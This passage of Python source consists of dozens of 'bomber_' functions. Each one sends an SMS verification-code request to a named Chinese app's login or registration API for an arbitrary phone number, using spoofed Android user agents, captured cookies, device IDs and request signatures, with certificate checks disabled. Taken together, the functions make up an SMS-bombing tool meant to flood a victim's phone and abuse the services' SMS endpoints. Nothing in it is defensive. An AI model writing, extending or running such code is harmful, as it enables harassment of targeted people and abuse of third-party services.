    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_cyr_mshen_xin(phone):
    'mshen.xin 发送验证码（支持任意手机号）'
    url = 'http://cyr.mshen.xin/Andr/get_Code'
    payload = {'tel': phone}
    headers = {'Content-Type': 'application/json; charset=utf-8', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/4.12.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_www_xiaosu_travel_cn(phone):
    'xiaosu-travel.cn 发送验证码（支持任意手机号）'
    url = 'https://www.xiaosu-travel.cn/app-api/member/auth/send-sms-code'
    payload = {'tenant_id': '1', 'scene': '1', 'mobile': phone}
    headers = {'terminal': '31', 'tenant_id': '1', 'authorization': 'Bearer', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_shuang_fuliaoxx_com(phone):
    'fuliaoxx.com 发送验证码（支持任意手机号）'
    url = 'https://shuang.fuliaoxx.com/api/sms/send'
    payload = {'event': 'mobilelogin', 'mobile': phone}
    headers = {'isToken': 'false', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_ziyue(phone):
    url = 'https://ziyue.中国/index/sendcode'
    payload = {'phone': phone, 'uszh': {'code': '', 'user_pas': '', 'user_zh': '', 'user_sjh': phone}}
    headers = {'Cookie': 'PHPSESSID=68d3fd11828f720fbfff7eb20b14e6f4', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)', 'Host': 'ziyue.xn--fiqs8s'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_botstreet_io(phone):
    'botstreet.io 发送验证码（支持任意手机号）'
    url = 'https://botstreet.io/api/v1/auth/send-code'
    payload = {'scene': 'sms-login', 'phone': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Accept': 'application/json', 'User-Agent': 'Dart/3.10 (dart:io)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_app_kayouxkd_com(phone):
    'kayouxkd.com 发送验证码（支持任意手机号）'
    url = 'https://app.kayouxkd.com/kayou-app/api/v1//sms/aliSend'
    payload = {'cid': '2eef15a5bedd53323bfd7b66bd35239cb', 'event': 'login', 'client': '1', 'mobile': phone}
    headers = {'versionnum': '103', 'version': '1.0.3', 'type': 'Android', 'token': '', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.14.9'}
    requests.post(url, data=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_developer_douya_wang(phone):
    'douya.wang 发送验证码（支持任意手机号）'
    url = 'https://developer.douya.wang/v2.0.0/api/common/smscode/code'
    payload = {'role': 'app', 'phone': phone}
    headers = {'Cookie': 'acw_tc=76b20f7917811665514287004ee9644f2f2e44b5f9df6bbd7e554632d5c10f', 'App-Id': '1044720160455280', 'Auth-Token': 'false', 'Sign-Token': 'c506f370491e377e81cef4666da524c3', 'Secret-Token': '4a9924aa8bb842c0cb8f60e6d7068572|1781166568', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, data=payload, headers=headers, timeout=10, verify=False)

def bomber_radar_api_liwusong_cn(phone):
    'liwusong.cn 发送验证码（支持任意手机号）'
    url = 'https://radar-api.liwusong.cn/api/auth/sms/send-code'
    payload = {'scene': 'LOGIN', 'phone': phone}
    headers = {'Cookie': 'JSESSIONID=1F984AF5A8D54B67D9508B71EB90E5EA', 'Content-Type': 'application/json;charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'ngrok-skip-browser-warning': '1', 'Accept-Encoding': 'gzip', 'Accept': 'application/json', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_xieqidong_com_cn(phone):
    'xieqidong.com.cn 发送验证码（支持任意手机号）'
    url = 'https://xieqidong.com.cn/api/send_sms_code'
    payload = {'client_fingerprint': 'idfv:c45b59b7-0df7-46ca-a716-773e654fa07d|model:PJE110|Android:16', 'scene': 'register', 'phone': phone}
    headers = {'Content-Type': 'application/json; charset=UTF-8', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.12.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_hs_fpv_com(phone):
    'hs-fpv.com 发送验证码（支持任意手机号）'
    url = 'https://hs-fpv.com/api/v1/auth/sms/send'
    payload = {'scene': 'login', 'phone': phone}
    headers = {'x-app-version': '0.2.31', 'x-app-flavor': 'prod', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.12 (dart:io)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_xiangqinhui_love(phone):
    'xiangqinhui.love 发送验证码（支持任意手机号）'
    url = 'https://api.xiangqinhui.love/api/v1/app/auth/otp/request'
    payload = {'phoneNumber': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'okhttp/4.12.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_dhhapi_gean5_top(phone):
    'gean5.top 发送验证码（支持任意手机号）'
    url = 'https://dhhapi.gean5.top/api/app/user/sendSmsCode'
    payload = {'mobile': phone}
    headers = {'token': '', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_api_server_dreamhangar_cn(phone):
    url = 'https://api-server.dreamhangar.cn/api/app/user/sendSmsCode'
    payload = {'mobile': phone}
    headers = {'token': '', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_app_younggenelove_cn(phone):
    'younggenelove.cn 发送验证码（支持任意手机号）'
    url = 'https://app.younggenelove.cn/yangjing-app/api/v1/sms/aliSend'
    payload = {'event': 'register', 'mobile': phone, 'user_id': ''}
    headers = {'Cookie': 'JSESSIONID=E30D56F311591C20722C95FF75A71037', 'accept-language': 'zh-CN,zh', 'Accept-Encoding': 'gzip, deflate', 'Accept': 'application/json,application/xml,application/xhtml+xml,text/html;q=0.9,image/webp,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Linux; U; Android 16; zh-cn; PJE110 Build/TP1A.220905.001) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'}
    requests.post(url, data=payload, headers=headers, timeout=10, verify=False)

def bomber_jnc_qquanyun_top(phone):
    'qquanyun.top 发送验证码（支持任意手机号）'
    url = 'http://jnc.qquanyun.top/api/sms/send'
    payload = {'device_id': '114695049B2DBC067822C251105876B5', 'event': 'mobilelogin', 'mobile': phone}
    headers = {'token': '', 'timestamp': '1781167756', 'sign': 'ba492f885770f0920a246237fb8bfd3e89bf57f5e731d21c80e02d10fe207eb5', 'appid': 'xiaoyunkeji001', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, data=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_www_aiyimaiquan_com(phone):
    url = 'https://www.aiyimaiquan.com/api/mobile/users/send-sms'
    payload = {'type': 'login', 'phone': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_api_xxsy_site(phone):
    'xxsy.site 发送验证码（支持任意手机号）'
    url = 'https://api.xxsy.site/commonUtils/captcha/getSmsCaptcha'
    payload2 = {'phoneNumber': phone}
    headers = {'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.11 (dart:io)'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_api_heartmeetai_com(phone):
    'heartmeetai.com 发送验证码（支持任意手机号）'
    url = 'https://api.heartmeetai.com/auth/send-sms-code'
    payload = {'purpose': 'register', 'country_code': '+86', 'phone': phone}
    headers = {'x-app-version': '1.3.2', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.11 (dart:io)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_tools_hnyynet_com_cn(phone):
    'hnyynet.com.cn 发送验证码（支持任意手机号）'
    url = 'https://tools.hnyynet.com.cn/tool-app/app/business/captcha'
    payload2 = {'phone': phone}
    headers = {'Cookie': 'PRODUCTID=1228;PKG=com.csylhl.zrjhwhk;CHANNEL=oppo;VER=1.0.0;OAID=F1B4E3F9825A4A4DB468EBF1CA0FD6C38d167affd63c32abfa58766cb5017157;APPCODE=jh_zrjhw;BRAND=OnePlus;MODEL=PJE110;HARDWAREINFO=873163d51fed40b8bfc39dbe84557c3e;OSVERSION=16;SESSIONID=2', 'Accept-Encoding': 'gzip', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_m_jiexiaoke_com(phone):
    url = 'https://m.jiexiaoke.com/api/sendSms'
    payload = {'phone': phone}
    headers = {'token': '', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_www_chat2080_com(phone):
    'chat2080.com 发送验证码（支持任意手机号）'
    url = 'https://www.chat2080.com/v1/user/send_sms_code'
    payload = {'phone': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.11 (dart:io)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_hmdj_genesisnode1_cn(phone):
    'genesisnode1.cn 发送验证码（支持任意手机号）'
    url = 'https://hmdj.genesisnode1.cn/prod-api/sms/sendCode'
    payload = {'mobile': phone}
    headers = {'Content-Type': 'application/json;charset=utf-8', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_www_dianjixinli_cn(phone):
    'dianjixinli.cn 发送验证码（支持任意手机号）'
    url = 'https://www.dianjixinli.cn/index.php'
    payload2 = {'s': '/api/sms/send'}
    payload = {'mobile': phone, 'event': 'mobilelogin'}
    headers = {'Content-Type': 'application/json;charset=utf-8', 'token': 'false', 'platform': 'APP', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, params=payload2, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_consumer_szxjhui_com(phone):
    'szxjhui.com 发送验证码（支持任意手机号）'
    url = 'https://consumer.szxjhui.com/agg/verification/send-sms'
    payload2 = {'type': 'USER_LOGIN'}
    payload = {'phoneNumber': phone, 'phoneRegion': '+86'}
    headers = {'x-scope': 'CUSTOMER', 'x-user': '', 'x-language': 'zh-CN', 'x-token': '', 'x-client': 'C_APP', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.11 (dart:io)'}
    requests.post(url, params=payload2, json=payload, headers=headers, timeout=10, verify=False)

def bomber_vchat_mokatech_cn(phone):
    'mokatech.cn 发送验证码（支持任意手机号）'
    url = 'https://vchat.mokatech.cn/account/captcha/sendv2'
    payload2 = {'fu': 'bc4265d8-0656-4288-9fd6-be1ee2cc19ad'}
    payload = {'lng': '', 'lat': '', 'channel_key': 'oppo', 'room_mute': '0', 'browser_UA': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36', 'browse_UA': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36', '_mmuid_': 'eb0e046b0af2f600881115b687156d4f132cc512', '_oaid_': 'F1B4E3F9825A4A4DB468EBF1CA0FD6C38d167affd63c32abfa58766cb5017157', '_uid_': '36814e2e22d7f9a0', '_imei_': '', '_net_': 'wifi', 'geet_token': '', 'type': '1', 'phone': phone, 'country': '+86', 'rtype': '5'}
    headers = {'cache-control': 'no-cache', 'x-lv': '1', 'x-kv': 'f14dd39f', 'accept-language': 'zh_CN', 'Accept-Encoding': 'gzip', 'User-Agent': 'Vchat/4.9.2.1 Android/2121 (PJE110; Android 16; Gapps 0; zh_CN; oppo; OnePlus)'}
    requests.post(url, params=payload2, data=payload, headers=headers, timeout=10, verify=False)

def bomber_api_mini_immomo_com(phone):
    'immomo.com 发送验证码（支持任意手机号）'
    url = 'https://api-mini.immomo.com/api/safe/verifycode/send'
    payload2 = {'fu': 'ef955e3208fb10760d2ebdeadacd5c81'}
    payload = {'_uid_': 'ef955e3208fb10760d2ebdeadacd5c81', '_net_': 'wifi', 'voiceSms': '0', '_iid': '88ed7aaa0805cc2eaaf6117feb4158e9', 'phonenumber': phone, 'countryCode': '+86'}
    headers = {'Cookie': 'SESSIONID=31994617-F51E-032A-D6A9-6477C325BE76_G', 'X-Trace-Id': 'EBBF1030-0D19-4067-931A-60F3A6D6A259', 'Accept-Language': 'zh-CN', 'Multiua': 'MomoChat/9.2.6.20_fast_64 Android/100365 (PJE110; Android 16; zh_CN; 12; OnePlus; fast)', 'Charset': 'UTF-8', 'X-Span-Id': '0', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'MomoChat/9.2.6_64 Android/8425 (PJE110; Android 16; Gapps 0; zh_CN; 12; OnePlus)'}
    requests.post(url, params=payload2, data=payload, headers=headers, timeout=10, verify=False)

def bomber_www_zaihun_com_cn(phone):
    'zaihun.com.cn 发送验证码（支持任意手机号）'
    url = 'https://www.zaihun.com.cn/m/reg_diy.php'
    payload2 = {'submitok': 'ajax_get_verify'}
    payload = {'js': '0', 'mob': phone}
    headers = {'Cookie': 'cook_index_bounce11=indexgg; PHPSESSID=23fcppl6jj31t2born6csuen35', 'priority': 'u=1, i', 'accept-language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7', 'referer': 'https://www.zaihun.com.cn/m/reg_diy.php?subscribe=&tguid=&ifback=1', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'x-requested-with': 'cn.zaihun.app', 'origin': 'https://www.zaihun.com.cn', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Android WebView";v="138"', 'sec-ch-ua-platform': '"Android"', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 Html5Plus/1.0'}
    requests.post(url, params=payload2, data=payload, headers=headers, timeout=10, verify=False)

def bomber_api_meetuvip_com(phone):
    'meetuvip.com 发送验证码（支持任意手机号）'
    url = 'https://api.meetuvip.com/user/login/sms_code'
    payload = {'verifiy_type': '1', 'nation_code': '86', 'mobile': phone}
    headers = {'Content-Type': 'application/json; charset=utf-8', 'cid': '', 'oaId': 'F1B4E3F9825A4A4DB468EBF1CA0FD6C38d167affd63c32abfa58766cb5017157', 'imei': '32A9E03DF9B10EC48383FEE5464F6139606DC0BF', 'client': '21', 'appId': '1', 'clientPlatform': '21', 'osVersion': '16', 'Authorization': '', 'pkg': 'com.deepvision.meetu', 'deviceId': '32A9E03DF9B10EC48383FEE5464F6139606DC0BF', 'version': '2.11.15', 'terminal': 'OnePlus PJE110', 'channel': 'oppo', 'Accept-Encoding': 'gzip', 'Accept': 'application/json', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/3.11.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_xiangbanwl_com(phone):
    'xiangbanwl.com 发送验证码（支持任意手机号）'
    url = 'https://api.xiangbanwl.com/login/sendsms'
    payload = {'id': phone}
    headers = {'content-type': 'application/json; charset=utf-8', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.9.3'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_pro_zhitian_api_timeshuttle_cn(phone):
    url = 'https://pro-zhitian-api.timeshuttle.cn/portal/sendSms'
    payload = {'phone': phone}
    headers = {'Version': '2.3.0', 'Sign': '527cccd57dc5ae211ed297a0a61009e8', 'Chnl': 'oppo', 'Timestamp': '1781173185', 'Brand': 'OnePlus PJE110 android 16', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/4.12.0'}
    requests.post(url, data=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_yilianxq_com(phone):
    'yilianxq.com 发送验证码（支持任意手机号）'
    url = 'https://api.yilianxq.com/api/sms/sendlogincode'
    payload = {'mobile': phone}
    headers = {'version': '1.3.9', 'client-id': 'bd8b5f6f-8b0f-4c91-8a03-193598b497f21781173387591', 'version-code': '1402', 'channel': 'oppo', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, data=payload, headers=headers, timeout=10, verify=False)

def bomber_www_jstantan_com(phone):
    'jstantan.com 发送验证码（支持任意手机号）'
    url = 'https://www.jstantan.com/home/sms/send'
    payload = {'phone': phone}
    headers = {'app-version': '8.7', 'device_uuid': '', 'app-type': 'android', 'app-platform': 'OPPO', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/3.12.10'}
    requests.post(url, data=payload, headers=headers, timeout=10, verify=False)

def bomber_api_xiban_net(phone):
    'xiban.net 发送验证码（支持任意手机号）'
    url = 'https://api.xiban.net/api/login/sendLoginSms'
    payload = {'mobile': phone}
    headers = {'Cookie': '', 'token': '', 'usevip': 'other', 'env': 'app', 'android': '38dd7dba77605306', 'mobilemodel': 'HydrogenOS', 'uid': '', 'versionapp': '2.6.7', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_api_ruiwiw_cn(phone):
    'ruiwiw.cn 发送验证码（支持任意手机号）'
    url = 'https://api.ruiwiw.cn/v1/api/auth/mobile_code'
    payload2 = {'type': '1', 'mobile': phone}
    headers = {'Content-Type': 'application/json', 'appootb-test': 'false', 'appootb-prd': 'snelc', 'appootb-ver': '2.7.3', 'appootb-os': '36', 'appootb-brand': 'kalama', 'appootb-pkg': 'com.friend.matchmaking', 'appootb-model': 'PJE110', 'appootb-plf': '256', 'appootb-channel': 'oppo', 'appootb-sn': '0594a8a4e117bd35e43b1c528df2f8f8', 'appootb-dev': 'false', 'appootb-token': '', 'appootb-time': '1781173760', 'appootb-udid': '41355f0c-9e12-486c-8fcc-b052c005c891', 'appootb-net': '2', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/3.12.8'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=(1 == 0))

def bomber_server_09784_com(phone):
    '09784.com 发送验证码（支持任意手机号）'
    url = 'https://server.09784.com/api/auth/getcode'
    payload2 = {'phone': phone}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_wzaapp_com(phone):
    'wzaapp.com 发送验证码（支持任意手机号）'
    url = 'https://api.wzaapp.com/api/pub/sendSms'
    payload2 = {'phoneNumber': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, params=payload2, json={}, headers=headers, timeout=10, verify=(1 == 0))

def bomber_papi_whhyn_shop(phone):
    url = 'https://papi.whhyn.shop/auth/sms/send'
    payload = {'phone': phone}
    headers = {'Content-Type': 'application/json; charset=UTF-8', 'versionCode': '30000015', 'clientVersion': '1.0.1.4', 'deviceMac': '2a88bbcddcd6776e', 'deviceId': '2a88bbcddcd6776e', 'saToken': '', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/4.11.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_www_sixbits_cn(phone):
    url = 'https://www.sixbits.cn/zcxq/sms/send'
    payload = {'mobile': phone}
    headers = {'dv': '16', 'p': 'android', 's': '1781174054975', 'v': '3.0.01', 'sign': 'db992c332722cda3ae473bc2b20c1aa5', 'a': 'zcxq702dsb1wnt23ge', 'dmf': 'OnePlus', 'dm': 'PJE110', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.7 (dart:io)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_api_laland_fun(phone):
    'laland.fun 发送验证码（支持任意手机号）'
    url = 'https://api.laland.fun/api/login/send_sms'
    payload = {'phone_number': phone, 'phone_country_code': '+86'}
    headers = {'X-Base-Version': '1.3.0', 'X-Version': '1.4.0', 'X-Version-Code': '455', 'X-Token': '', 'X-User-Id': '', 'X-Device-Brand': 'oneplus', 'X-App-Channel': 'oppo', 'X-Uni-Platform': 'app', 'X-Base-Version-Code': '402', 'X-OS': 'android', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_www_tuodanmatou_com(phone):
    'tuodanmatou.com 发送验证码（支持任意手机号）'
    url = 'https://www.tuodanmatou.com/api/sms/send'
    payload = {'mobile': phone, 'event': 'mobilelogin'}
    headers = {'Content-Type': 'application/json;charset=UTF-8', 'token': '', 'version': '154', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_www_huihuang_world(phone):
    'huihuang.world 发送验证码（支持任意手机号）'
    url = 'http://www.huihuang.world/app_api/send_code'
    payload = {'mobile': phone}
    headers = {'Content-Type': 'application/json; charset=utf-8', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/4.12.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_api_sxqqh_cn(phone):
    'sxqqh.cn 发送验证码（支持任意手机号）'
    url = 'https://api.sxqqh.cn/api/user/SendPhoneMsg'
    payload = {'SourceType': '注册', 'AreaId': '08daf9e350584df78aee7239985b7658', 'PhoneNo': phone}
    headers = {'Content-Type': 'application/json; charset=utf-8', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.9.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_matchmaking_jlikeji_cn(phone):
    url = 'https://matchmaking.jlikeji.cn/api/sms/sendCode'
    payload = {'channel': 6, 'scene': 'BDSJHM', 'mobile': phone}
    headers = {'timestamp': '1781175286', 'platform': 'ANDROID', 'nonce': 'rv1zS5QDX1jht8293ChKI7Y6bckTV9Jb', 'sign': '249CA0D6C2D8D86C85038BC9006C9DB4', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_www_littlelove_com_cn(phone):
    'littlelove.com.cn 发送验证码（支持任意手机号）'
    url = 'https://www.littlelove.com.cn/minilike/account/login/getCode'
    payload = {'phone': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_liveopapp_sumlive_cn(phone):
    'sumlive.cn 发送验证码（支持任意手机号）'
    url = 'https://liveopapp.sumlive.cn/live/operation/control/helper/auth/user/sendCaptcha'
    payload = {'phone': phone}
